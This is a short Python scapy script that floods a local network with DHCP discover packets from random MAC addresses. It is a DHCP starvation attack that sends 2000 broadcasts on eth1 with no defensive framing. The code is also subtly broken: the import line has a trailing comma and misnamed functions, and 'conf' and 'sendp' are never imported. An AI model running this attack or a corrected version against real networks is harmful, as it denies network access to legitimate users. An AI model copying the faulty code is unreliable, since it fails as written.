#! /usr/bin/env python3

import scapy 
from scapy.all import Ether,IP,UDP,BOOTP,DHCP,RanDMAC,

conf.checkIPaddr = False

for x in range(2000):
    path = Ether(src=RandMac(),dst='ff:ff:ff:ff:ff:ff')
    ip = IP(src='0.0.0.0',dst='255.255.255.255')
    port = UDP(sport=68,dport=67)
    port2 = BOOTP(op=1,chaddr=RandMac())
    dhcp = DHCP(options=[("message-type","discover"),("end")])

    dhcp_attack= path/ip/port/port2/dhcp

    sendp(dhcp_attack,iface="eth1")








